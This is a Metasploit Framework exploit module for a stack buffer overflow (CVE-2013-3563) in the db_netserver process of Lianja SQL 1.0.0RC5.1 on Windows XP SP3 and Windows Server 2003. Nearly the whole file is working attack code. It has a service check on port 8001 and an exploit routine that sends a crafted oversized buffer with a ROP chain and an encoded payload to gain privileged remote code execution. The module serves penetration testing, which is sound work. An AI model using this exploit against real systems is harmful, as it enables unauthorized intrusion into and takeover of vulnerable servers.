# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::RopDb

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Lianja SQL 1.0.0RC5.1 db_netserver Stack Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a stack buffer overflow in the db_netserver process which
        is spawned by the Lianja SQL server.  The issue is fixed in Lianja SQL 1.0.0RC5.2.
      },
      &#039;Author&#039;         => &#039;Spencer McIntyre&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     => [
        [ &#039;CVE&#039;, &#039;2013-3563&#039; ]
      ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039; => 20
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Payload&#039;        =>
        {
          &#039;StackAdjustment&#039; => -3500,
          &#039;Space&#039;           => 500,
          &#039;BadChars&#039;        => "\x01"
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Lianja SQL 1.0.0RC5.1 / Windows Server 2003 SP1-SP2&#039;, { &#039;rop_target&#039; => &#039;2003&#039; } ],
          [ &#039;Lianja SQL 1.0.0RC5.1 / Windows XP SP3&#039;, { &#039;rop_target&#039; => &#039;xp&#039; } ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;May 22 2013&#039;))

    register_options(
      [
        Opt::RPORT(8001),
      ], self.class)
  end

  def check
    begin
      connect
    rescue
      return Exploit::CheckCode::Safe
    end
    sock.put("db_net")
    if sock.recv(4) =~ /\d{1,5}/
      return Exploit::CheckCode::Detected
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    connect
    sock.put("db_net")
    sock.recv(4)

    print_status("#{rhost}:#{rport} - Sending Malicious Data")
    evil_data =  &#039;000052E1&#039;
    evil_data << &#039;A&#039;
    evil_data << (&#039;0&#039; * 19991) # this can&#039;t be randomized, else a Read Access Violation will occur
    evil_data << generate_rop_payload(&#039;msvcrt&#039;, payload.encoded, {&#039;target&#039; => target[&#039;rop_target&#039;]})
    sock.put(evil_data)
    disconnect
  end
end

